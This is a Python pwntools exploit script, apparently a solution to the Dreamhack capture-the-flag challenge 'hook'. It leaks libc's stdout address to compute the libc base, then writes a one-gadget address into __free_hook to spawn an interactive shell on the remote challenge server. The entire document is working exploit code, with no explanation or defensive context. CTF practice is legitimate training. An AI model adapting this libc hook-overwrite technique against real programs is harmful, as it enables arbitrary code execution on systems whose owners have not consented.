from pwn import *
import sys

if len(sys.argv)!=2:
    log.info("try 'python ex.py -l' for local")
    log.info("try 'python ex.py -r' for remote")
    exit(0)

if sys.argv[1]=="-r":
    p = remote('host1.dreamhack.games',15869)
elif sys.argv[1]=="-l":
    p = process('hook')
else:
    log.info("options: -l for local, -r for remote")
    exit(0)

e=ELF('./hook')
libc=ELF('./libc.so.6')

# Offsets
free_hook_offset=libc.symbols['__free_hook']
stdout_offset=libc.symbols['_IO_2_1_stdout_']
oneshot_offset=0x4526a

p.recvuntil("stdout: ")

# Addresses
stdout_address=int(p.recvuntil("\n").strip("\n"),16)
libc_base=stdout_address-stdout_offset
free_hook_address=libc_base+free_hook_offset
oneshot_address=libc_base+oneshot_offset

log.info("stdout_address: {}".format(hex(stdout_address)))
log.info("libc_base: {}".format(hex(libc_base)))
log.info("free_hook_address: {}".format(hex(free_hook_address)))
log.info("oneshot_adderss: {}".format(hex(oneshot_address)))

payload=p64(free_hook_address)
payload+=p64(oneshot_address)

p.sendlineafter("Size: ","32")
p.sendafter("Data: ",payload)

p.interactive()